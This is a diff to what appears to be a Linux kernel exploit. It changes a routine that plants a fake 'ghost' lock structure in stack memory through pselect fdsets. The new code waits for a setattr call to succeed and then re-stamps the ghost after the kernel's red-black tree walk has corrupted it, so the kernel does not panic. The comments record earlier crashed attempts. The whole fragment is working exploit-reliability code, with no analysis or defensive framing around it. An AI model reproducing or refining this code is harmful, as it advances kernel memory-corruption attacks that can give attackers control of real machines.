@@ -2645,15 +2645,23 @@ void do_pselect_fake_lock_route(void) {
           break;
         }
         if (atomic_load(&consumer_calls) > 0) {
-          /* STOP THE MOMENT THE PUNCH STARTS (calls, not success —
-           * success is post-setattr): the chain walk mutates the ghost's
-           * words (enqueue writes pc/parent into them). Any further
-           * re-stamp overwrites kernel-written linkage mid-walk — the
-           * next rb_insert_color then reads our stale pc=1 instead of
-           * the kernel's parent → NULL grandparent deref (the +0x5a8
-           * rb_insert_color KP). After the last stamp the waiter thread
-           * goes QUIESCENT in the blocking select (vDSO waits, no
-           * fdset copy) and the walk owns the words. */
+          /* PHASE 2 — HEAL (jc21 post-mortem): stop stamping while the
+           * walk runs (no tear during the walk), but do NOT quiesce:
+           * the walk MUTATES the ghost (kernel rb linkage written into
+           * our stack stamp) and every post-walk re-walk of the mutated
+           * ghost is the jc18/20/21 post-punch KP. jc12 survived BECAUSE
+           * its continuous re-stamp overwrote the mutations (self-
+           * healing). Wait for setattr to RETURN (success), then resume
+           * re-stamping to heal the ghost, then quiesce. */
+          while (!atomic_load(&consumer_success) &&
+                 !atomic_load(&punch_consume_stop))
+            sched_yield();
+          int heal = env_int_range("SPIN_HEAL_ITERS", 64, 0, 100000);
+          for (int h = 0; h < heal; h++) {
+            prepare_pselect_fdsets(&sin, &sout, &sex);
+            struct timeval tvh = {0, 0};
+            select(PSELECT_ROUTE_NFDS, &sin, &sout, &sex, &tvh);
+          }
           break;
         }
         clock_gettime(CLOCK_MONOTONIC, &spn);
